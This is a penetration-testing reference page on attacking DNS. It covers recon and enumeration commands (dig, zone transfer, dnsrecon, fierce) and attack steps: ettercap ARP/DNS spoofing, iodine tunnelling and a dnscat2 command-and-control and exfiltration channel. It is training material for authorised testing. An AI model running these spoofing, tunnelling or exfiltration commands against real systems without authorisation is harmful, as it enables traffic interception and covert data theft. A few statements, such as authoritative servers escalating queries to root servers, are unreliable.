# DNS

**`Default Port: 53`**

**DNS (Domain Name System)** functions as the internet's phonebook, converting user-friendly domain names like hackviser.com into numerical IP addresses, enabling swift access to online resources. DNS is a hierarchical and decentralized naming system for computers, services, or any resource connected to the Internet or a private network. It translates human-readable domain names to numerical IP addresses, essential for locating and identifying computer services and devices within network protocols.

DNS operates on a client-server model, with the resolver sending requests to DNS servers, which then respond with the requested information.

* **Root Servers:** These manage the highest level of the DNS hierarchy and oversee top-level domains globally, stepping in if lower-level servers fail to respond. ICANN supervises these 13 root servers.
* **Authoritative Nameservers:** They hold the final authority for queries within their designated zones, providing definitive responses. If they cannot respond, queries are escalated to root servers.
* **Non-authoritative Nameservers:** These servers lack domain ownership and acquire domain information through queries to other servers.
* **Caching DNS Servers:** These servers store previous query answers for a specified duration, speeding up future responses. The cache duration is determined by the authoritative server.
* **Forwarding Servers:** They simply forward queries to other servers.
* **Resolvers:** Integrated into computers or routers, resolvers perform local name resolution without being authoritative.

### Recon <a href="#recon" id="recon"></a>

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Banner grabbing is used to identify DNS server versions. You can use the following commands:

```
# Use dig to determine DNS server versions
dig version.bind CHAOS TXT @DNS

# Alternatively, use nmap script to grab the banner
nmap --script dns-nsid <DNS_IP>

# Alternatively, use telnet to grab the banner
nc -nv -u <DNS_IP> 53
```

\### DNS Server Discovery

Identifying the DNS servers associated with a target domain is a critical first step. Tools like `dig` and `nslookup` can be employed to find nameservers:

```
# Using dig
dig NS <target-domain>

# Using nslookup
nslookup -type=NS <target-domain>
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Automation <a href="#automation" id="automation"></a>

```
dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f <WORDLIST> <DOMAIN>
```

#### Using dig <a href="#using-dig" id="using-dig"></a>

A command-line tool used to perform DNS queries and gather information about DNS servers.

```
# Query DNS records
dig hackviser.com

# Query specific type of DNS records (e.g., A record)
dig A hackviser.com

# Perform a reverse DNS lookup
dig -x <IP_ADDRESS>

# Query a specific DNS server
dig @<DNS_SERVER_IP> hackviser.com
```

#### Using nslookup <a href="#using-nslookup" id="using-nslookup"></a>

```
# Perform DNS queries
nslookup hackviser.com

# Query a specific type of DNS record (e.g., MX record)
nslookup -type=MX hackviser.com

# Query a specific DNS server
nslookup hackviser.com <DNS_IP>
```

#### Using host <a href="#using-host" id="using-host"></a>

A tool used to perform DNS queries and determine IP addresses.

```
# Perform DNS query
host hackviser.com

# Query specific type of DNS records (e.g., MX record)
host -t MX hackviser.com

# Perform a reverse DNS lookup
host <IP_ADDRESS>
```

#### Any Record Query <a href="#any-record-query" id="any-record-query"></a>

To retrieve all available entries from a DNS server, you can use the following command:

```
dig any victim.com @<DNS_IP>
```

#### Zone Transfer <a href="#zone-transfer" id="zone-transfer"></a>

AXFR query is a DNS protocol request used to retrieve all records of a domain from a DNS server:

**Using dig**

dig is the standard tool for DNS zone transfers:

```
# Without specifying a domain
dig axfr @<DNS_IP>

# With specific domain
dig axfr @<DNS_IP> <DOMAIN>
```

**Using fierce**

fierce automates zone transfers and can perform dictionary attacks:

```
fierce --domain <DOMAIN> --dns-servers <DNS_IP>
```

#### Metasploit Modules and Nmap Scripts <a href="#metasploit-modules-and-nmap-scripts" id="metasploit-modules-and-nmap-scripts"></a>

```
msfconsole
use auxiliary/gather/enum_dns
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>
```

#### DNS Reverse and Subdomain Brute Force <a href="#dns-reverse-and-subdomain-brute-force" id="dns-reverse-and-subdomain-brute-force"></a>

```
dnsrecon -r 127.0.0.0/24 -n <IP_DNS>
dnsrecon -r 127.0.1.0/24 -n <IP_DNS>
dnsrecon -r <IP_DNS>/24 -n <IP_DNS>
dnsrecon -d active.htb -a -n <IP_DNS>
```

#### DNS Cache Snooping <a href="#dns-cache-snooping" id="dns-cache-snooping"></a>

DNS cache snooping is a technique used to query the DNS cache to gather information about past DNS records. This method can be used to access hidden or confidential information within a network.

```
# Querying the DNS cache
dnsrecon -t std -d hackviser.com -D /usr/share/dnsrecon/namelist.txt
```

#### DNS Enumeration with Google Dorks <a href="#dns-enumeration-with-google-dorks" id="dns-enumeration-with-google-dorks"></a>

DNS enumeration using Google Dorks involves collecting DNS information for a specific domain using advanced Google search operators. This method serves as a comprehensive information gathering technique for cybersecurity assessments.

```
# Collecting DNS information using Google Dorks
site:hackviser.com -www.hackviser.com -site:www.hackviser.com
```

#### DNS Enumeration Using Maltego <a href="#dns-enumeration-using-maltego" id="dns-enumeration-using-maltego"></a>

Visualization tools like Maltego can be used to collect and visualize DNS information. This provides a more comprehensive analysis, representing relationships and connections within the target network visually.

```
# DNS mapping with Maltego
maltego
```

#### DNS Enumeration Using Online Tools <a href="#dns-enumeration-using-online-tools" id="dns-enumeration-using-online-tools"></a>

Various online DNS enumeration tools are available to gather and analyze DNS information. These tools typically perform extensive queries and present results conveniently.

1. **DNS Dumpster**: [dnsdumpster.com](https://dnsdumpster.com/) - An online tool used to gather DNS information for a specific domain. It provides subdomains, MX records, NS records, and more.
2. **DNS Recon**: [dnsrecon.com](https://dnsrecon.com/) - A comprehensive information gathering and penetration testing tool for domains. It includes subdomains, DNS records, reverse DNS queries, and more.
3. **Spyse**: [spyse.com](https://spyse.com/) - A platform for extensive asset gathering. It includes DNS information, subdomains, SSL certificates, and more.
4. **SecurityTrails**: [securitytrails.com](https://securitytrails.com/) - A platform for asset tracking. It includes DNS history, subdomains, IP addresses, and more.
5. **DNSlytics**: [dnslytics.com](https://dnslytics.com/) - An online platform for researching and analyzing DNS information. It provides WHOIS data, DNS records, domain history, and more.

#### DNS Enumeration via Certificate Transparency Logs <a href="#dns-enumeration-via-certificate-transparency-logs" id="dns-enumeration-via-certificate-transparency-logs"></a>

Certificate Transparency logs monitor widely used SSL/TLS certificates for domain names and subdomains. These logs can be used to identify subdomains and services used by a target.

1. **DNS CertSpotter**: Utilize online tools like [certspotter.com](https://certspotter.com/) to scan Certificate Transparency (CT) logs for a specific domain.
2. **Subdomain Enumeration**: Examine SSL/TLS certificates listed in CT logs and identify subdomains associated with a particular target domain.

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### DNS Spoofing <a href="#dns-spoofing" id="dns-spoofing"></a>

DNS spoofing involves introducing corrupt Domain Name System data into a DNS resolver's cache, causing the name server to return an incorrect IP address, diverting traffic to the attacker's computer.

Ettercap is a comprehensive suite for man-in-the-middle attacks on LAN. It can be used for DNS spoofing.

```
ettercap -T -q -M arp:remote /<gateway-ip>// /<target-ip>// -P dns_spoof
```

#### DNS Tunneling <a href="#dns-tunneling" id="dns-tunneling"></a>

DNS Tunneling leverages DNS queries and responses to encapsulate data of other programs or protocols in DNS queries and responses.

Iodine lets you tunnel IPv4 data through a DNS server.

```
# Server side
iodined -f -c <tunnel-ip> <domain>

# Client side
iodine <dns-server-ip> <domain>
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Cache Snooping <a href="#cache-snooping" id="cache-snooping"></a>

Cache snooping is a technique to determine if a DNS server has specific records in its cache.

```
dig @<dns-server> <domain> +norecurse
```

#### Reverse DNS Lookup <a href="#reverse-dns-lookup" id="reverse-dns-lookup"></a>

Reverse DNS lookup is a DNS query for the domain name associated with a given IP address.

```
dig -x <ip-address>
```

#### DNS Exfiltration <a href="#dns-exfiltration" id="dns-exfiltration"></a>

Data exfiltration over DNS involves encoding data in DNS queries and responses, allowing data to be extracted from a network covertly.

dnscat2 is designed to create an encrypted command-and-control channel over the DNS.

```
# Server side
dnscat2 --dns server=<dns-server-ip>:53

# Client side
dnscat2 <domain>
```

Tags:

* [Port 53](https://hackviser.com/tactics/tags/port-53)
